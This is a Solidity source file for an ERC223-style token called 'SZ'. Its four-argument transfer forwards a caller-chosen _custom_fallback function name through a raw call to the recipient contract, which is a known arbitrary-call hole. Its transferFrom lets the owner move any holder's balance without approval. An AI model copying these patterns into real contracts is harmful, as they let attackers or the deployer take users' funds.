1 pragma solidity ^0.4.9;
2  
3 
4 contract SafeMath {
5     uint256 constant public MAX_UINT256 =
6     0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF;
7 
8     function safeAdd(uint256 x, uint256 y) pure internal returns (uint256 z) {
9         if (x > MAX_UINT256 - y) assert(false);
10         return x + y;
11     }
12 
13     function safeSub(uint256 x, uint256 y) pure internal returns (uint256 z) {
14         if (x < y) assert(false);
15         return x - y;
16     }
17 
18     function safeMul(uint256 x, uint256 y) pure internal returns (uint256 z) {
19         if (y == 0) return 0;
20         if (x > MAX_UINT256 / y) assert(false);
21         return x * y;
22     }
23 }
24 
25 contract ContractReceiver {
26     function tokenFallback(address _from, uint _value, bytes _data) public;
27 }
28  
29 contract SZ is SafeMath { 
30     
31     event Transfer(address indexed _from, address indexed _to, uint256 _value, bytes _data);
32 
33     mapping(address => uint) balances;
34   
35     string public name    = "SZ";
36     string public symbol  = "SZ";
37     uint8 public decimals = 10;
38     uint256 public totalSupply;
39 	address owner;
40   
41     constructor(uint256 _supply, string _name, string _symbol, uint8 _decimals) public
42     {
43         if (_supply == 0) _supply = 10000000000;
44 
45         owner = msg.sender;
46         balances[owner] = _supply;
47         totalSupply = balances[owner];
48 
49         name = _name;
50         decimals = _decimals;
51         symbol = _symbol;
52     }
53     
54 
55   
56   
57   // Function to access name of token .
58   function name() public constant returns (string _name) {
59       return name;
60   }
61   // Function to access symbol of token .
62   function symbol() public constant returns (string _symbol) {
63       return symbol;
64   }
65   // Function to access decimals of token .
66   function decimals() public constant returns (uint8 _decimals) {
67       return decimals;
68   }
69   // Function to access total supply of tokens .
70   function totalSupply() public constant returns (uint256 _totalSupply) {
71       return totalSupply;
72   }
73   
74   
75   // Function that is called when a user or another contract wants to transfer funds .
76   function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
77       
78     if(isContract(_to)) {
79         if (balanceOf(msg.sender) < _value) assert(false);
80         balances[msg.sender] = safeSub(balanceOf(msg.sender), _value);
81         balances[_to] = safeAdd(balanceOf(_to), _value);
82         assert(_to.call.value(0)(bytes4(keccak256(abi.encodePacked(_custom_fallback))), msg.sender, _value, _data));
83         emit Transfer(msg.sender, _to, _value, _data);
84         return true;
85     }
86     else {
87         return transferToAddress(_to, _value, _data);
88     }
89 }
90   
91 
92   // Function that is called when a user or another contract wants to transfer funds .
93   function transfer(address _to, uint _value, bytes _data) public returns (bool success) {
94       
95     if(isContract(_to)) {
96         return transferToContract(_to, _value, _data);
97     }
98     else {
99         return transferToAddress(_to, _value, _data);
100     }
101 }
102   
103     // Standard function transfer similar to ERC20 transfer with no _data .
104     // Added due to backwards compatibility reasons .
105     function transfer(address _to, uint _value) public returns (bool success) {
106 
107         //standard function transfer similar to ERC20 transfer with no _data
108         //added due to backwards compatibility reasons
109         bytes memory empty;
110         if(isContract(_to)) {
111             return transferToContract(_to, _value, empty);
112         }
113         else {
114             return transferToAddress(_to, _value, empty);
115         }
116     }
117 
118 	//assemble the given address bytecode. If bytecode exists then the _addr is a contract.
119     function isContract(address _addr) private view returns (bool is_contract) {
120         uint length;
121         assembly {
122         //retrieve the size of the code on target address, this needs assembly
123             length := extcodesize(_addr)
124         }
125         return (length>0);
126     }
127 
128 	//function that is called when transaction target is an address
129     function transferToAddress(address _to, uint _value, bytes _data) private returns (bool success) {
130         if (balanceOf(msg.sender) < _value) assert(false);
131         balances[msg.sender] = safeSub(balanceOf(msg.sender), _value);
132         balances[_to] = safeAdd(balanceOf(_to), _value);
133         emit Transfer(msg.sender, _to, _value, _data);
134         return true;
135     }
136   
137   //function that is called when transaction target is a contract
138     function transferToContract(address _to, uint _value, bytes _data) private returns (bool success) {
139         if (balanceOf(msg.sender) < _value) assert(false);
140         balances[msg.sender] = safeSub(balanceOf(msg.sender), _value);
141         balances[_to] = safeAdd(balanceOf(_to), _value);
142         ContractReceiver receiver = ContractReceiver(_to);
143         receiver.tokenFallback(msg.sender, _value, _data);
144         emit Transfer(msg.sender, _to, _value, _data);
145         return true;
146     }
147 
148     function transferFrom(address _from, address _to, uint256 _value) public {
149         if(!isOwner()) return;
150 
151         if (balances[_from] < _value) return;    
152         if (safeAdd(balances[_to] , _value) < balances[_to]) return;
153 
154         balances[_from] = safeSub(balances[_from],_value);
155         balances[_to] = safeAdd(balances[_to],_value);
156         /* Notifiy anyone listening that this transfer took place */
157         bytes memory empty;
158         emit Transfer(_from, _to, _value,empty);
159     }
160 
161 	function isOwner() public view  
162     returns (bool)  {
163         return owner == msg.sender;
164     }
165 	
166     function balanceOf(address _owner) public constant returns (uint balance) {
167         return balances[_owner];
168     }
169 }